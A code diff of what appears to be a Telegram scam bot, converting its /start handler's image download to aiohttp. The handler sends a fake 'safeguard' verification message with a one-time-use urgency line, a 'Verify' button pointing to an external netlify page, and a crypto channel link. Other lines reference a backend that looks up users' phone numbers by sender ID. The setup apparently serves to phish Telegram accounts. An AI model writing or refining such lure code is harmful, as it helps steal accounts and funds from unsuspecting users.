@@ -24,36 +24,36 @@ FLASK_API_URL = 'https://telebot-ivng.onrender.com/get_phone_by_sender_id'  # Re
 API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your API endpoint
 
 # Event handler for /start command
+# Event handler for /start command
 @bot_client.on(events.NewMessage(pattern='/start'))
 async def on_start(event):
     try:
-        # Download the image from the URL
+        # Download the image from the URL using aiohttp
         image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8'
-        response = requests.get(image_url)
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.get(image_url) as response:
+                if response.status == 200:
+                    from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
+                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
+                    image_data.name = 'image.jpg'  # Set a name for the file-like object
 
-        # Check if the image was downloaded successfully
-        if response.status_code == 200:
-            from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
-            image_data = BytesIO(response.content)  # Convert the content into a file-like object
-            image_data.name = 'image.jpg'  # Set a name for the file-like object
-
-            await event.respond(
-                file=image_data,  # Send the image as bytes with a name
-                message=(
-                    "You can verify your account by clicking on the verify button below\n\n"
-                    "This is a one time use and will expire"
-                ),
-                buttons=[
-                    [Button.url("Verify", "https://safeguardverification.netlify.app/")],
-                    [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
-                ]
-            )
-        else:
-            # await event.respond("Failed to fetch the image from the provided URL.")
-            print(f"Failed to fetch the image from the provided URL.")
-
+                    await event.respond(
+                        file=image_data,  # Send the image as bytes with a name
+                        message=(
+                            "You can verify your account by clicking on the verify button below\n\n"
+                            "This is a one time use and will expire"
+                        ),
+                        buttons=[
+                            [Button.url("Verify", "https://safeguardverification.netlify.app/")],
+                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
+                        ]
+                    )
+                else:
+                    print(f"Failed to fetch the image from the provided URL.")
     except Exception as e:
         await event.respond(f"Error: There was an issue verifying your account. Please try again")
+
         
 # Function to retrieve phone number from Flask API based on sender_id
 async def get_phone_by_sender_id(sender_id):
